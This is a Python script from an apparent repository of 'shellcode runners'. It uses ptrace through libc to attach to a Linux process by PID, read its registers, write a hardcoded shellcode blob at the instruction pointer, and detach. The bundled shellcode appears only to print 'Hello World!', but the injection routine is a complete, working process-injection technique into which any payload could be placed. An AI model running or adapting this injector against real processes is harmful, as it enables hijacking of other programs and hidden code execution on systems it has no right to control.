#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This repository implements multiples way to execute
#    shellcode with different platforms, systems and languages.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ShellcodeRunners"

copyright = """
ShellcodeRunners  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from ctypes import cdll, c_char_p, c_ulonglong, c_void_p
from sys import argv, stderr, exit

if len(argv) != 2:
        print("USAGES: python3 shellcode_injection_Linux.py <pid:integer>", file=stderr)
        exit(1)

pid = int(argv[1])
libc = cdll.LoadLibrary("libc.so.6")
shellcode = (
        b"\x48\xb8\x72\x6c\x64\x21\x0a\x00\x00\x00\x50\x48\xb8\x48\x65\x6c"
        b"\x6c\x6f\x20\x57\x6f\x50\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6"
        b"\x48\xc7\xc2\x0d\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05"
)

if libc.ptrace(16, pid, None, None):
        print("ptrace attach failed", file=stderr)
        exit(2)

if libc.waitpid(pid, None, 0) != pid:
        print("wait pid failed", file=stderr)
        exit(3)

registers = c_char_p((b'\0' * 8) * 27)
if libc.ptrace(12, pid, None, registers):
        print("ptrace get registers failed", file=stderr)
        exit(4)

rip = int.from_bytes(registers._objects[16 * 8:17 * 8], byteorder='little')
rip += 2

while shellcode:
        print(hex(rip), hex(int.from_bytes(shellcode[:8], byteorder='little')))
        if libc.ptrace(4, pid, c_void_p(rip), c_ulonglong(int.from_bytes(shellcode[:8], byteorder='little'))):
                print("ptrace write data failed", file=stderr)
                exit(5)
        shellcode = shellcode[8:]
        rip += 8

if libc.ptrace(17, pid, None, None):
        print("ptrace detach failed", file=stderr)
        exit(6)

exit(0)
